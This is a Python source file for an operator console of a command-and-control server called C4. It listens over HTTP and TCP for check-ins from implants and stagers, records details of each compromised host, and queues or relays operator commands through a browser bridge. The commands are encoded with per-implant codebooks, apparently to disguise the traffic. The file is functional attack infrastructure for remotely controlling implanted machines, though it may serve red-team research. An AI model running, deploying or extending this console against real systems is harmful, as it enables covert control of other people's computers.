#!/usr/bin/env python3
"""
C4 Operator Console — TUI frontend for the C4 C2 server.

Listens for beacon check-ins on an HTTP port and provides an interactive
operator console for selecting beacons and issuing commands.

Usage:
    python console.py                  # listen on default port 9050
    python console.py --port 8443      # custom port
"""

from __future__ import annotations

import argparse
import asyncio
import json
import logging
import shlex
import sys
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path

import yaml

# Add build/ to path so we can import encode module
sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "build"))
from encode import (  # noqa: E402
    CodewordMap,
    ValueMap,
    encode as encode_action,
    load_codebook,
    load_value_codebook,
)

# Add operator/ dir to path for browser_bridge
sys.path.insert(0, str(Path(__file__).resolve().parent))
from browser_bridge import BrowserBridge  # noqa: E402

from aiohttp import web
from rich.text import Text
from textual import on, work
from textual.app import App, ComposeResult
from textual.binding import Binding
from textual.containers import Horizontal, Vertical
from textual.css.query import NoMatches
from textual.message import Message
from textual.reactive import reactive
from textual.widgets import (
    Footer,
    Header,
    Input,
    Label,
    ListItem,
    ListView,
    RichLog,
    Static,
)

log = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Tool catalog (loaded from implant_actions.yaml)
# ---------------------------------------------------------------------------

_ACTIONS_PATH = Path(__file__).resolve().parent.parent / "implant_actions.yaml"


@dataclass
class ToolParam:
    name: str
    type: str
    required: bool
    description: str


@dataclass
class ToolDef:
    name: str
    description: str
    params: list[ToolParam]

    @property
    def usage(self) -> str:
        parts = [self.name]
        for p in self.params:
            tag = f"<{p.name}>" if p.required else f"[{p.name}]"
            parts.append(tag)
        return " ".join(parts)


def _load_tools(path: Path = _ACTIONS_PATH) -> list[ToolDef]:
    if not path.exists():
        return []
    data = yaml.safe_load(path.read_text())
    tools: list[ToolDef] = []
    for name, spec in (data.get("tools") or {}).items():
        params = []
        for pname, pspec in (spec.get("parameters") or {}).items():
            params.append(
                ToolParam(
                    name=pname,
                    type=pspec.get("type", "string"),
                    required=pspec.get("required", False),
                    description=pspec.get("description", ""),
                )
            )
        tools.append(
            ToolDef(
                name=name,
                description=(spec.get("description") or "").strip(),
                params=params,
            )
        )
    return tools


TOOL_CATALOG: list[ToolDef] = _load_tools()

# Map tool name → list of its parameter names (for parsing operator input)
_TOOL_PARAMS: dict[str, list[str]] = {
    t.name: [p.name for p in t.params] for t in TOOL_CATALOG
}

# ---------------------------------------------------------------------------
# Implant encoder (per-implant codebook lookup)
# ---------------------------------------------------------------------------

_C4_DIR = Path(__file__).resolve().parent.parent
_OUT_DIR = _C4_DIR / "out"
_VALUE_CODEBOOK = _C4_DIR / "value_codebook.yaml"


class ImplantEncoder:
    """Loads and caches the codebook for a specific implant instance."""

    def __init__(
        self,
        implant_id: str,
        tool_to_codes: CodewordMap,
        param_to_codes: CodewordMap,
        value_map: ValueMap,
    ) -> None:
        self.implant_id = implant_id
        self.tool_to_codes = tool_to_codes
        self.param_to_codes = param_to_codes
        self.value_map = value_map

    def encode(self, action: dict[str, str]) -> str:
        return encode_action(
            self.tool_to_codes,
            self.param_to_codes,
            action,
            self.value_map or None,
        )


# Cache: implant_id → ImplantEncoder
_encoder_cache: dict[str, ImplantEncoder] = {}


def get_encoder(implant_id: str) -> ImplantEncoder | None:
    """Load (or return cached) encoder for the given implant instance."""
    if implant_id in _encoder_cache:
        return _encoder_cache[implant_id]

    codebook_path = _OUT_DIR / implant_id / "codebook.yaml"
    if not codebook_path.exists():
        return None

    tool_to_codes, param_to_codes = load_codebook(str(codebook_path))
    value_map = load_value_codebook(str(_VALUE_CODEBOOK))

    enc = ImplantEncoder(implant_id, tool_to_codes, param_to_codes, value_map)
    _encoder_cache[implant_id] = enc
    return enc


def parse_operator_command(raw: str) -> dict[str, str] | str:
    """Parse operator input into an action dict for encoding.

    Supports two forms:
        tool_name arg1 arg2 ...        (positional — mapped to params in order)
        tool_name param=value ...      (keyword)

    Returns the action dict on success, or an error string on failure.
    """
    try:
        tokens = shlex.split(raw)
    except ValueError as e:
        return f"Parse error: {e}"

    if not tokens:
        return "Empty command"

    tool_name = tokens[0]
    if tool_name not in _TOOL_PARAMS:
        return f"Unknown tool: {tool_name}"

    param_names = _TOOL_PARAMS[tool_name]
    action: dict[str, str] = {"name": tool_name}
    args = tokens[1:]

    # Detect keyword mode if any arg contains '='
    if any("=" in a for a in args):
        for arg in args:
            if "=" not in arg:
                return f"Mixed positional/keyword args not supported: {arg}"
            key, _, val = arg.partition("=")
            if key not in param_names:
                return f"Unknown parameter '{key}' for {tool_name}. Valid: {', '.join(param_names)}"
            action[key] = val
    else:
        # Positional mode
        if len(args) > len(param_names):
            return (
                f"{tool_name} takes at most {len(param_names)} arg(s), got {len(args)}. "
                f"Params: {', '.join(param_names)}"
            )
        for i, val in enumerate(args):
            action[param_names[i]] = val

    # Verify at least one param present (encoder requires it)
    if len(action) < 2:
        required = [
            p.name
            for t in TOOL_CATALOG
            if t.name == tool_name
            for p in t.params
            if p.required
        ]
        return f"{tool_name} requires: {', '.join(required)}"

    return action


# ---------------------------------------------------------------------------
# Data model
# ---------------------------------------------------------------------------

STALE_SECONDS = 30  # beacon considered stale after this many seconds


@dataclass
class Beacon:
    id: str
    hostname: str
    username: str
    ip: str
    os: str
    pid: int
    first_seen: float
    last_seen: float
    implant_id: str | None = None
    bridge_url: str | None = None
    alias: str | None = None
    command_queue: list[dict] = field(default_factory=list)

    @property
    def display_name(self) -> str:
        return self.alias or self.hostname

    @property
    def is_alive(self) -> bool:
        return (time.time() - self.last_seen) < STALE_SECONDS

    @property
    def status_text(self) -> str:
        return "alive" if self.is_alive else "stale"

    @property
    def last_seen_ago(self) -> str:
        delta = int(time.time() - self.last_seen)
        if delta < 60:
            return f"{delta}s ago"
        if delta < 3600:
            return f"{delta // 60}m {delta % 60}s ago"
        return f"{delta // 3600}h {(delta % 3600) // 60}m ago"


class BeaconRegistry:
    """Thread-safe-ish beacon store (single-threaded asyncio is fine)."""

    def __init__(self) -> None:
        self._beacons: dict[str, Beacon] = {}

    def checkin(self, data: dict) -> Beacon:
        bid = data.get("id") or str(uuid.uuid4())
        now = time.time()
        if bid in self._beacons:
            b = self._beacons[bid]
            b.hostname = data.get("hostname", b.hostname)
            b.username = data.get("username", b.username)
            b.ip = data.get("ip", b.ip)
            b.os = data.get("os", b.os)
            b.pid = data.get("pid", b.pid)
            b.implant_id = data.get("implant_id", b.implant_id)
            b.bridge_url = data.get("bridge_url", b.bridge_url)
            b.last_seen = now
        else:
            b = Beacon(
                id=bid,
                hostname=data.get("hostname", "UNKNOWN"),
                username=data.get("username", "?"),
                ip=data.get("ip", "?"),
                os=data.get("os", "?"),
                pid=data.get("pid", 0),
                first_seen=now,
                last_seen=now,
                implant_id=data.get("implant_id"),
                bridge_url=data.get("bridge_url"),
            )
            self._beacons[bid] = b
        return b

    def get(self, key: str) -> Beacon | None:
        """Lookup by id or alias or hostname (case-insensitive)."""
        if key in self._beacons:
            return self._beacons[key]
        key_lower = key.lower()
        for b in self._beacons.values():
            if (
                b.alias and b.alias.lower() == key_lower
            ) or b.hostname.lower() == key_lower:
                return b
        return None

    def all(self) -> list[Beacon]:
        return list(self._beacons.values())

    def __len__(self) -> int:
        return len(self._beacons)


# ---------------------------------------------------------------------------
# HTTP listener
# ---------------------------------------------------------------------------

registry = BeaconRegistry()

# Will be set by the app once mounted so the handler can push UI updates.
_app_ref: C4Console | None = None


async def handle_checkin(request: web.Request) -> web.Response:
    try:
        data = await request.json()
    except (json.JSONDecodeError, ValueError):
        return web.json_response({"error": "bad json"}, status=400)

    beacon = registry.checkin(data)

    # Queue: return any pending commands back to the beacon
    commands = beacon.command_queue[:]
    beacon.command_queue.clear()

    # Notify TUI via message (safe cross-context)
    if _app_ref is not None:
        _app_ref.post_message(C4Console.BeaconCheckin(beacon.id))

    return web.json_response({"status": "ok", "commands": commands})


async def start_http(port: int) -> web.AppRunner:
    app = web.Application()
    app.router.add_post("/beacon", handle_checkin)
    runner = web.AppRunner(app, access_log=None)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    return runner


# ---------------------------------------------------------------------------
# TCP listener (raw stager beacons: "BRIDGE <implant_id> <url>")
# ---------------------------------------------------------------------------

# Browser bridge instance (shared across the app)
browser_bridge = BrowserBridge(headless=False)


async def _handle_tcp_client(
    reader: asyncio.StreamReader, writer: asyncio.StreamWriter
) -> None:
    """Handle a single TCP beacon from the stager."""
    addr = writer.get_extra_info("peername")
    try:
        data = await asyncio.wait_for(reader.read(4096), timeout=10)
        line = data.decode("utf-8", errors="replace").strip()
        if not line:
            return

        parts = line.split(maxsplit=2)
        msg_type = parts[0] if parts else ""

        if msg_type == "BRIDGE" and len(parts) == 3:
            implant_id, bridge_url = parts[1], parts[2]
            # Register as a beacon with the bridge URL
            beacon = registry.checkin(
                {
                    "id": implant_id,
                    "implant_id": implant_id,
                    "hostname": f"{addr[0]}" if addr else "unknown",
                    "ip": addr[0] if addr else "?",
                    "username": "?",
                    "os": "?",
                    "pid": 0,
                    "bridge_url": bridge_url,
                }
            )
            log.info("BRIDGE beacon: %s → %s", implant_id[:12], bridge_url)
            if _app_ref is not None:
                _app_ref.post_message(C4Console.BridgeBeacon(beacon.id, bridge_url))

        elif msg_type == "SESSION" and len(parts) == 3:
            implant_id = parts[1]
            log.info("SESSION beacon: %s → %s", implant_id[:12], parts[2])
            if _app_ref is not None:
                _app_ref.post_message(C4Console.BeaconCheckin(implant_id))

        else:
            log.info("Unknown TCP beacon from %s: %s", addr, line[:120])

    except (asyncio.TimeoutError, OSError) as e:
        log.debug("TCP client error from %s: %s", addr, e)
    finally:
        writer.close()
        await writer.wait_closed()


async def start_tcp(port: int) -> asyncio.Server:
    server = await asyncio.start_server(_handle_tcp_client, "0.0.0.0", port)
    return server


# ---------------------------------------------------------------------------
# TUI Widgets
# ---------------------------------------------------------------------------


class BeaconListItem(ListItem):
    """A single entry in the beacon sidebar."""

    def __init__(self, beacon: Beacon) -> None:
        super().__init__()
        self.beacon = beacon

    def compose(self) -> ComposeResult:
        status = "●" if self.beacon.is_alive else "○"
        color = "green" if self.beacon.is_alive else "red"
        yield Label(
            f"[{color}]{status}[/] {self.beacon.display_name}",
            markup=True,
        )


class BeaconDetailPanel(Static):
    """Shows metadata for the currently selected beacon."""

    def update_beacon(self, beacon: Beacon | None) -> None:
        if beacon is None:
            self.update("[dim]No beacon selected[/]")
            return
        lines = [
            "[bold cyan]BEACON DETAIL[/]",
            "",
            f"  [bold]ID:[/]       {beacon.id[:12]}",
            f"  [bold]Host:[/]     {beacon.hostname}",
            f"  [bold]User:[/]     {beacon.username}",
            f"  [bold]IP:[/]       {beacon.ip}",
            f"  [bold]OS:[/]       {beacon.os}",
            f"  [bold]PID:[/]      {beacon.pid}",
            f"  [bold]Implant:[/]  {beacon.implant_id[:12] if beacon.implant_id else '[red]none[/]'}",
            f"  [bold]Alias:[/]    {beacon.alias or '—'}",
            f"  [bold]Status:[/]   {'[green]alive[/]' if beacon.is_alive else '[red]stale[/]'}",
            f"  [bold]Checkin:[/]  {beacon.last_seen_ago}",
            f"  [bold]First:[/]    {datetime.fromtimestamp(beacon.first_seen, tz=timezone.utc).strftime('%H:%M:%S UTC')}",
            f"  [bold]Queued:[/]   {len(beacon.command_queue)} cmd(s)",
        ]
        self.update("\n".join(lines))


# ---------------------------------------------------------------------------
# Main App
# ---------------------------------------------------------------------------


class C4Console(App):
    """C4 Operator Console."""

    class BeaconCheckin(Message):
        """Posted by the HTTP handler when a beacon checks in."""

        def __init__(self, beacon_id: str) -> None:
            super().__init__()
            self.beacon_id = beacon_id

    class BridgeBeacon(Message):
        """Posted when a BRIDGE beacon arrives with a session URL."""

        def __init__(self, beacon_id: str, bridge_url: str) -> None:
            super().__init__()
            self.beacon_id = beacon_id
            self.bridge_url = bridge_url

    TITLE = "C4 Operator Console"
    CSS = """
    Screen {
        layout: vertical;
    }

    #main-area {
        height: 1fr;
    }

    #beacon-sidebar {
        width: 30;
        border-right: solid $accent;
        height: 100%;
    }

    #sidebar-title {
        text-style: bold;
        color: $text;
        background: $boost;
        padding: 0 1;
        width: 100%;
    }

    #beacon-list {
        height: 1fr;
    }

    #right-area {
        width: 1fr;
        height: 100%;
    }

    #detail-panel {
        height: auto;
        max-height: 16;
        padding: 1 2;
        border-bottom: solid $accent;
    }

    #interaction-area {
        height: 1fr;
        padding: 0;
    }

    #interaction-title {
        text-style: bold;
        color: $text;
        background: $boost;
        padding: 0 1;
        width: 100%;
    }

    #interaction-log {
        height: 1fr;
    }

    #cmd-input {
        dock: bottom;
    }

    #no-session {
        height: 1fr;
        content-align: center middle;
        color: $text-muted;
    }
    """

    BINDINGS = [
        Binding("ctrl+q", "quit", "Quit", show=True),
        Binding("ctrl+b", "focus_beacons", "Beacons", show=True),
        Binding("ctrl+i", "focus_input", "Input", show=True),
    ]

    selected_beacon: reactive[Beacon | None] = reactive(None)
    interacting_beacon: reactive[Beacon | None] = reactive(None)
    listen_port: int = 9050
    tcp_port: int = 9090

    def compose(self) -> ComposeResult:
        yield Header()
        with Horizontal(id="main-area"):
            with Vertical(id="beacon-sidebar"):
                yield Label("BEACONS", id="sidebar-title")
                yield ListView(id="beacon-list")
            with Vertical(id="right-area"):
                yield BeaconDetailPanel(id="detail-panel")
                with Vertical(id="interaction-area"):
                    yield Label("SESSION — none", id="interaction-title")
                    yield RichLog(id="interaction-log", highlight=True, markup=True)
                    yield Input(
                        placeholder="Type a command or 'help'...",
                        id="cmd-input",
                    )
        yield Footer()

    def on_mount(self) -> None:
        global _app_ref
        _app_ref = self
        self._log("[bold cyan]C4 Operator Console[/] started")
        self._log(f"HTTP listener: [bold]0.0.0.0:{self.listen_port}[/]")
        self._log(f"TCP  listener: [bold]0.0.0.0:{self.tcp_port}[/] (stager beacons)")
        self._log("Waiting for beacons...\n")
        self._log(
            "[dim]Commands: beacons, interact <name>, alias <id> <name>, back, quit, help[/]\n"
        )
        self._start_http_listener()
        self._start_tcp_listener()
        self._start_status_refresh()

    @work(exclusive=True, group="http")
    async def _start_http_listener(self) -> None:
        self._runner = await start_http(self.listen_port)

    @work(exclusive=True, group="tcp")
    async def _start_tcp_listener(self) -> None:
        self._tcp_server = await start_tcp(self.tcp_port)

    @work(exclusive=True, group="status")
    async def _start_status_refresh(self) -> None:
        """Periodically refresh the beacon list to update stale indicators."""
        while True:
            await asyncio.sleep(5)
            self.refresh_beacons()

    # -- Beacon notifications ----------------------------------------------

    def on_c4_console_beacon_checkin(self, event: BeaconCheckin) -> None:
        beacon = registry.get(event.beacon_id)
        if beacon:
            self._log(
                f"[green]✓[/] Beacon check-in: [bold]{beacon.display_name}[/] ({beacon.ip})"
            )
        self.refresh_beacons()

    def on_c4_console_bridge_beacon(self, event: BridgeBeacon) -> None:
        beacon = registry.get(event.beacon_id)
        if beacon:
            self._log(
                f"\n[bold green]⚡ BRIDGE BEACON[/] from [bold]{beacon.display_name}[/]"
            )
            self._log(f"  [dim]Implant:[/] {event.beacon_id[:12]}")
            self._log(f"  [dim]URL:[/]     {event.bridge_url}")
            self._log(
                f"  [dim]Use [cyan]interact {beacon.display_name}[/] to open browser session[/]\n"
            )
        self.refresh_beacons()

    # -- Beacon list management ------------------------------------------

    def refresh_beacons(self) -> None:
        """Rebuild the beacon ListView from the registry."""
        try:
            lv: ListView = self.query_one("#beacon-list", ListView)
        except NoMatches:
            return
        lv.clear()
        for beacon in registry.all():
            lv.append(BeaconListItem(beacon))

        # Also refresh detail if a beacon is selected
        if self.selected_beacon:
            fresh = registry.get(self.selected_beacon.id)
            if fresh:
                self.selected_beacon = fresh
                self._update_detail(fresh)

    @on(ListView.Selected, "#beacon-list")
    def beacon_selected(self, event: ListView.Selected) -> None:
        item = event.item
        if isinstance(item, BeaconListItem):
            self.selected_beacon = item.beacon
            self._update_detail(item.beacon)

    def _update_detail(self, beacon: Beacon | None) -> None:
        try:
            panel: BeaconDetailPanel = self.query_one(
                "#detail-panel", BeaconDetailPanel
            )
            panel.update_beacon(beacon)
        except NoMatches:
            pass

    # -- Command input ---------------------------------------------------

    @on(Input.Submitted, "#cmd-input")
    def on_command(self, event: Input.Submitted) -> None:
        raw = event.value.strip()
        event.input.value = ""
        if not raw:
            return

        # Parse command
        parts = raw.split()
        cmd = parts[0].lower()

        if cmd == "help":
            self._log(
                "\n[bold]Commands:[/]\n"
                "  [cyan]beacons[/]              — list all beacons\n"
                "  [cyan]interact <name|id>[/]   — start session with a beacon\n"
                "  [cyan]alias <id> <name>[/]    — set a beacon alias\n"
                "  [cyan]tools[/]                — show available beacon tools\n"
                "  [cyan]back[/]                 — exit current session\n"
                "  [cyan]quit[/]                 — exit console\n"
            )
        elif cmd == "tools":
            self._show_tool_catalog()
        elif cmd == "beacons":
            self._show_beacon_table()
        elif cmd == "interact":
            if len(parts) < 2:
                self._log("[red]Usage: interact <name|id>[/]")
                return
            self._enter_session(parts[1])
        elif cmd == "alias":
            if len(parts) < 3:
                self._log("[red]Usage: alias <id|hostname> <new_alias>[/]")
                return
            self._set_alias(parts[1], parts[2])
        elif cmd == "back":
            self._exit_session()
        elif cmd == "quit" or cmd == "exit":
            self.exit()
        else:
            # If we have an active session, treat as beacon command
            if self.interacting_beacon:
                self._send_command(raw)
            else:
                self._log(
                    f"[red]Unknown command:[/] {raw}. Type [cyan]help[/] for commands."
                )

    # -- Session management ----------------------------------------------

    def _enter_session(self, name: str) -> None:
        beacon = registry.get(name)
        if not beacon:
            self._log(f"[red]Beacon not found:[/] {name}")
            return
        self.interacting_beacon = beacon
        self.selected_beacon = beacon
        self._update_detail(beacon)
        try:
            title: Label = self.query_one("#interaction-title", Label)
            title.update(f"SESSION — {beacon.display_name}")
            inp: Input = self.query_one("#cmd-input", Input)
            inp.placeholder = f"C4 ({beacon.display_name}) > "
        except NoMatches:
            pass
        self._log(
            f"\n[bold green]Entered session with {beacon.display_name}[/] ({beacon.id[:12]})"
        )

        # Auto-open browser if we have a bridge URL
        if beacon.bridge_url and beacon.implant_id:
            self._log("[dim]Opening browser session...[/]")
            self._open_browser(beacon.implant_id, beacon.bridge_url)
        elif not beacon.bridge_url:
            self._log(
                "[yellow]No bridge URL — commands will be queued (HTTP poll mode)[/]"
            )

        self._log(
            "[dim]Type commands to send. 'back' to return. 'tools' to list available tools.[/]\n"
        )
        self._show_tool_catalog()

    @work(exclusive=False, group="browser")
    async def _open_browser(self, implant_id: str, bridge_url: str) -> None:
        try:
            await browser_bridge.open_session(implant_id, bridge_url)
            self._log("[green]✓[/] Browser session ready")
        except Exception as e:
            self._log(f"[red]Browser open failed:[/] {e}")

    def _exit_session(self) -> None:
        if not self.interacting_beacon:
            self._log("[dim]No active session.[/]")
            return
        name = self.interacting_beacon.display_name
        self.interacting_beacon = None
        try:
            title: Label = self.query_one("#interaction-title", Label)
            title.update("SESSION — none")
            inp: Input = self.query_one("#cmd-input", Input)
            inp.placeholder = "Type a command or 'help'..."
        except NoMatches:
            pass
        self._log(f"[yellow]Exited session with {name}[/]\n")

    def _send_command(self, raw: str) -> None:
        beacon = self.interacting_beacon
        if not beacon:
            return

        self._log(f"[bold]C4[/] ({beacon.display_name}) > {raw}")

        # Parse operator input into action dict
        result = parse_operator_command(raw)
        if isinstance(result, str):
            self._log(f"  [red]{result}[/]")
            return

        action = result

        # Look up the implant's codebook and encode
        if not beacon.implant_id:
            self._log(
                "  [yellow]WARNING: beacon has no implant_id — sending raw (no encoding)[/]"
            )
            encoded = raw
        else:
            encoder = get_encoder(beacon.implant_id)
            if encoder is None:
                self._log(
                    f"  [yellow]WARNING: codebook not found for implant {beacon.implant_id[:12]}[/]"
                )
                self._log(f"  [dim]expected: out/{beacon.implant_id}/codebook.yaml[/]")
                self._log("  [yellow]Sending raw (no encoding)[/]")
                encoded = raw
            else:
                try:
                    encoded = encoder.encode(action)
                except (ValueError, KeyError) as e:
                    self._log(f"  [red]Encoding failed: {e}[/]")
                    return

                self._log(
                    f"  [dim]encoded →[/] [italic]{encoded[:120]}{'...' if len(encoded) > 120 else ''}[/]"
                )

        # Deliver via browser bridge if available, otherwise queue for HTTP poll
        if beacon.implant_id and beacon.implant_id in browser_bridge.active_sessions:
            self._log("  [dim]sending via browser...[/]")
            self._send_via_browser(beacon.implant_id, encoded)
        else:
            cmd_entry = {
                "id": str(uuid.uuid4())[:8],
                "command": encoded,
                "raw": raw,
                "action": action,
                "queued_at": time.time(),
            }
            beacon.command_queue.append(cmd_entry)
            self._log(
                f"  [dim]queued → {cmd_entry['id']}  ({len(beacon.command_queue)} pending)[/]"
            )

    @work(exclusive=False, group="browser-cmd")
    async def _send_via_browser(self, implant_id: str, encoded: str) -> None:
        try:
            response = await browser_bridge.send_and_receive(implant_id, encoded)
            self._log("\n[bold cyan]Response:[/]")
            # Truncate very long responses for the TUI
            if len(response) > 2000:
                self._log(response[:2000])
                self._log(f"  [dim]... ({len(response)} chars total, truncated)[/]")
            else:
                self._log(response)
            self._log("")
        except Exception as e:
            self._log(f"  [red]Browser send failed:[/] {e}")

    # -- Alias -----------------------------------------------------------

    def _set_alias(self, key: str, alias: str) -> None:
        beacon = registry.get(key)
        if not beacon:
            self._log(f"[red]Beacon not found:[/] {key}")
            return
        old = beacon.display_name
        beacon.alias = alias
        self._log(f"[green]Aliased[/] {old} → [bold]{alias}[/]")
        self.refresh_beacons()

    # -- Tool catalog ----------------------------------------------------

    def _show_tool_catalog(self) -> None:
        if not TOOL_CATALOG:
            self._log("[dim]No tools loaded (implant_actions.yaml not found).[/]")
            return
        self._log("[bold cyan]Available Tools:[/]")
        for t in TOOL_CATALOG:
            self._log(f"  [bold green]{t.usage}[/]")
            self._log(f"    [dim]{t.description}[/]")
            for p in t.params:
                req = "[bold red]*[/]" if p.required else " "
                self._log(f"    {req} [cyan]{p.name}[/] ({p.type}) — {p.description}")
        self._log("")

    # -- Beacon table ----------------------------------------------------

    def _show_beacon_table(self) -> None:
        beacons = registry.all()
        if not beacons:
            self._log("[dim]No beacons registered.[/]")
            return
        self._log("\n[bold]Active Beacons:[/]")
        for b in beacons:
            status = "[green]●[/]" if b.is_alive else "[red]○[/]"
            self._log(
                f"  {status} {b.display_name:<20} {b.ip:<16} {b.username:<12} {b.last_seen_ago}"
            )
        self._log("")

    # -- Logging ---------------------------------------------------------

    def _log(self, msg: str) -> None:
        try:
            rich_log: RichLog = self.query_one("#interaction-log", RichLog)
            rich_log.write(Text.from_markup(msg))
        except NoMatches:
            pass

    # -- Actions ---------------------------------------------------------

    def action_focus_beacons(self) -> None:
        try:
            self.query_one("#beacon-list", ListView).focus()
        except NoMatches:
            pass

    def action_focus_input(self) -> None:
        try:
            self.query_one("#cmd-input", Input).focus()
        except NoMatches:
            pass


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------


def main() -> None:
    parser = argparse.ArgumentParser(description="C4 Operator Console")
    parser.add_argument(
        "--port", type=int, default=9050, help="HTTP listener port (default: 9050)"
    )
    parser.add_argument(
        "--tcp-port",
        type=int,
        default=9090,
        help="TCP listener port for stager beacons (default: 9090)",
    )
    parser.add_argument(
        "--headless",
        action="store_true",
        help="Run browser sessions in headless mode",
    )
    args = parser.parse_args()

    browser_bridge.headless = args.headless

    app = C4Console()
    app.listen_port = args.port
    app.tcp_port = args.tcp_port
    app.run()


if __name__ == "__main__":
    main()
